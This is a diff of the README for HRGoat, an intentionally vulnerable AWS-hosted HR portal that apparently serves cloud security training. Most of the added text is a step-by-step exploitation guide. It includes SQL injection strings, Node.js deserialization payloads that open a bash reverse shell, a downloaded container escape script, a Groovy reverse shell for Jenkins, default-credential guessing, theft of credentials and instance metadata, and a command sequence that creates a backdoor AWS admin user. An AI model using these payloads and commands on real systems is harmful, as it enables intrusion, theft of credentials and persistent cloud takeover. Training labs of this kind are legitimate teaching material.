@@ -244,10 +244,290 @@ The Terraform state is stored in an S3 bucket with a unique name using the forma
 ## Security Notes
 
 - The RDS instance is publicly accessible with a fixed password for demonstration purposes
-- The application container runs with the `--privileged` flag, introducing a container escape vulnerability (see [docs/SECURITY_VULNERABILITY.md](docs/SECURITY_VULNERABILITY.md))
 - In a production environment, consider:
   - Using AWS Secrets Manager for database credentials
   - Implementing private subnets for RDS
   - Enabling RDS backups
-  - Removing the `--privileged` flag from container run commands
-  - Implementing proper container security measures
+  - Using HTTPS with proper certificates
+
+# HRGoat - Cloud Security Vulnerability Training Environment
+
+This repository contains the HRGoat application - an intentionally vulnerable HR management portal designed to demonstrate common cloud security vulnerabilities in a controlled environment. It simulates a realistic HR system with multiple security flaws that can be exploited to practice offensive security techniques and understand cloud security concepts.
+
+## Project Overview
+
+HRGoat is created for:
+- Security professionals to practice cloud-based exploitation techniques
+- DevOps engineers to understand secure deployment practices
+- Development teams to learn about secure coding
+- Organizations to use in security awareness training
+
+> ⚠️ **WARNING**: This application contains deliberate security vulnerabilities. Deploy it only in isolated, controlled environments and never in production or connected to sensitive systems.
+
+## Application Description
+
+HRGoat mimics a modern HR management system with features including:
+- Employee management (create, update, delete, bulk upload)
+- Document handling and storage
+- User authentication and authorization
+- Profile management
+- Notification systems
+
+The application is built using:
+- Frontend: React
+- Backend: Node.js/Express
+- Database: MySQL
+- Infrastructure: AWS resources deployed via Terraform
+- Containerization: Docker
+- CI/CD: GitHub Actions workflows
+
+## Deployment Instructions
+
+### Deploying with GitHub Actions
+
+The repository includes automated workflows for deployment:
+
+1. **Prerequisites**:
+   - GitHub account
+   - AWS account with appropriate permissions
+   - The following GitHub secrets configured:
+     - `AWS_ACCESS_KEY_ID`
+     - `AWS_SECRET_ACCESS_KEY`
+
+2. **Deployment Steps**:
+   - Fork this repository to your GitHub account
+   - Navigate to "Settings" → "Secrets" and add the required AWS credentials
+   - Go to the "Actions" tab and select the "Create Infrastructure and Deploy Application" workflow
+   - Click "Run workflow" to start the deployment process
+   - The workflow will:
+     - Create a unique S3 bucket for Terraform state
+     - Deploy AWS infrastructure using Terraform
+     - Build and push the Docker image to ECR
+     - Deploy the application to EC2 instances
+
+3. **Accessing the Application**:
+   - Once deployed, the workflow output will display:
+     - Application Load Balancer URL
+     - EC2 instance IP addresses
+     - Jenkins server URL
+
+## Vulnerability Overview & Exploitation Guide
+
+This section documents the vulnerabilities present in HRGoat and how to exploit them for educational purposes.
+
+### 1. SQL Injection Vulnerability
+
+**Location**: Employee search functionality
+
+**Exploitation**:
+1. Navigate to the employee directory page
+2. In the search field, enter: `' OR 1=1 --`
+3. This will bypass the search restrictions and display all employees
+4. For more advanced exploitation, use: `' UNION SELECT user,password,3,4,5,6,7,8,9,10,11 FROM users --`
+5. This reveals user credentials from the database
+
+**Impact**: Data exposure, potential for complete database compromise
+
+### 2. Insecure Deserialization Vulnerability
+
+**Location**: Employee bulk upload feature
+
+**Exploitation**:
+1. Navigate to the "Bulk Upload" page under employee management
+2. Create a malicious JSON payload with an RCE exploit in the metadata field:
+```json
+{
+  "name": "Test User",
+  "position": "Tester",
+  "department": "Security",
+  "email": "test@example.com",
+  "phone": "555-000-0000",
+  "location": "Remote",
+  "hire_date": "2023-01-01",
+  "status": "active",
+  "manager": "None",
+  "salary": 0,
+  "bio": "This is a test.",
+  "metadata": "{\"rce\":\"_$$ND_FUNC$$_function(){const cp = require('child_process'); const fs = require('fs'); try { cp.exec('ping -c 4 8.8.8.8', function(error, stdout, stderr) { if (error) { fs.writeFileSync('/tmp/error.log', 'ERROR: ' + error.message); } else { fs.writeFileSync('/tmp/ping_success.log', stdout); } }); } catch (e) { fs.writeFileSync('/tmp/exception.log', 'EXCEPTION: ' + e.message); } return '';}()\"}"
+}
+```
+3. Upload this payload using the "Upload Employees" button
+4. The `metadata` field contains a Node.js deserialization vulnerability that allows remote code execution
+5. Verify exploitation by checking if `/tmp/ping_success.log` was created
+
+**Advanced Exploitation - Reverse Shell**:
+```json
+{
+  "name": "Malicious User",
+  "position": "Hacker",
+  "department": "Security",
+  "email": "hack@example.com",
+  "phone": "555-000-0000",
+  "location": "Remote",
+  "hire_date": "2023-01-01",
+  "status": "active",
+  "manager": "None",
+  "salary": 0,
+  "bio": "This is a test.",
+  "metadata": "{\"rce\":\"_$$ND_FUNC$$_function(){const cp = require('child_process'); const fs = require('fs'); try { fs.writeFileSync('/tmp/shell_attempt.log', 'Attempting reverse shell'); cp.exec('/bin/bash -c \\\"/bin/bash -i > /dev/tcp/YOUR_IP_HERE/4444 0<&1 2>&1\\\"', function(error, stdout, stderr) { if (error) { fs.writeFileSync('/tmp/shell_error.log', 'ERROR: ' + error.message); } else { fs.writeFileSync('/tmp/shell_success.log', 'Shell executed successfully'); } if (stderr) { fs.writeFileSync('/tmp/shell_stderr.log', stderr); } }); } catch (e) { fs.writeFileSync('/tmp/shell_exception.log', 'EXCEPTION: ' + e.message); } return '';}()\"}"
+}
+```
+Replace `YOUR_IP_HERE` with your attack machine's IP and set up a listener with `nc -lvnp 4444`
+
+**Impact**: Complete remote code execution on the application container
+
+### 3. Container Escape Vulnerability
+
+**Location**: Docker container configuration
+
+**Prerequisites**:
+- Access to the application container (via previous RCE)
+- The container is running with the `--privileged` flag
+
+**Exploitation**:
+1. From your reverse shell in the container, download the container escape script:
+```bash
+curl -o escape.sh https://raw.githubusercontent.com/yourusername/hr-portal-symphony/main/container_escape_shell.sh
+chmod +x escape.sh
+./escape.sh
+```
+
+2. The script will detect the privileged container and offer multiple methods:
+   - Direct host filesystem access via disk mount
+   - Cgroups release_agent exploitation
+   - Several shell access options:
+     - Chroot shell
+     - Bind shell
+     - Reverse shell
+     - Command execution bridge
+
+3. For the simplest approach, choose the direct chroot shell if the host filesystem mount succeeds
+
+**Impact**: Complete escape from container isolation, gaining access to the underlying host
+
+### 4. Network Discovery & Jenkins Exploitation
+
+**After container escape, install tools and discover Jenkins**:
+```bash
+# Install nmap on the host
+apt-get update
+apt-get install -y nmap
+
+# Scan the internal network (10.0.0.0/16 subnet for AWS VPC)
+nmap -sV -p- 10.0.0.0/16 --open
+```
+
+**Exploiting Jenkins**:
+1. The scan should reveal Jenkins running on port 8080 within the same VPC
+2. Access the Jenkins instance (using internal IP or hostname)
+3. Jenkins exploitation options:
+   - If unauthenticated access to script console:
+     ```
+     navigate to /script and execute: 
+     println "whoami".execute().text
+     ```
+   - If credentials are required, common default credentials:
+     - admin:admin
+     - admin:password
+     - jenkins:jenkins
+   - Create a reverse shell via script console:
+     ```groovy
+     String host="YOUR_IP_HERE";
+     int port=5555;
+     String cmd="/bin/bash";
+     Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+     Socket s=new Socket(host,port);
+     InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
+     OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+     while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+     ```
+   - Start another listener: `nc -lvnp 5555`
+
+### 5. Jenkins Container Breakout & Privilege Escalation
+
+**Check if Jenkins container is privileged**:
+```bash
+cat /proc/self/status | grep CapEff
+```
+
+**If privileged, escape the container**:
+```bash
+# Use the same container escape technique from earlier
+./container_escape_shell.sh
+```
+
+**Perform host privilege escalation if needed**:
+```bash
+# Check for common misconfigurations
+find / -perm -4000 -exec ls -l {} \; 2>/dev/null  # SUID binaries
+find / -writable -type d 2>/dev/null  # Writable directories
+sudo -l  # Sudo permissions
+
+# If Docker is available on the host
+docker images
+# If you have Docker access, you can mount the host filesystem:
+docker run -v /:/hostfs -it ubuntu chroot /hostfs bash
+```
+
+### 6. AWS IAM Privilege Escalation
+
+**Check AWS credentials and permissions**:
+```bash
+# Look for AWS credentials
+find / -name "credentials" | grep ".aws"
+cat ~/.aws/credentials
+env | grep AWS
+
+# Check attached IAM role
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+**Enumerate permissions**:
+```bash
+# Install AWS CLI if needed
+apt-get install -y python3-pip
+pip3 install awscli
+
+# List permissions
+aws iam list-attached-role-policies --role-name $(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+aws iam get-policy-version --policy-arn <policy_arn> --version-id <version_id>
+```
+
+**If overly permissive IAM policy exists, create an admin user**:
+```bash
+# Create admin user
+aws iam create-user --user-name backdoor-admin
+
+# Assign administrator permissions
+aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# Create access keys
+aws iam create-access-key --user-name backdoor-admin
+
+# Output will show:
+# AccessKeyId: AKIAXXXXXXXXXXXXXXXX
+# SecretAccessKey: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+```
+
+## Security Remediation
+
+To address the vulnerabilities in this application, consider the following remediations:
+
+1. **SQL Injection**: Implement parameterized queries and input validation
+2. **Insecure Deserialization**: Avoid deserializing user-controlled data or implement secure deserialization libraries
+3. **Container Security**: Never use the `--privileged` flag; apply principle of least privilege
+4. **Network Segmentation**: Implement proper VPC security groups and network ACLs
+5. **Jenkins Security**: Use strong authentication, remove default credentials, restrict Script Console access
+6. **IAM Security**: Follow least privilege principle for IAM policies; implement role assumption with temporary credentials
+
+## Responsible Disclosure
+
+This project is intended for educational purposes in controlled environments. If you discover similar vulnerabilities in production systems, please follow responsible disclosure practices.
+
+## License
+
+This project is licensed under the MIT License - see the LICENSE file for details.
+
+## Disclaimer
+
+This software is provided for educational purposes only. Using security testing techniques on systems without explicit permission is illegal. The author is not responsible for any misuse of this software.
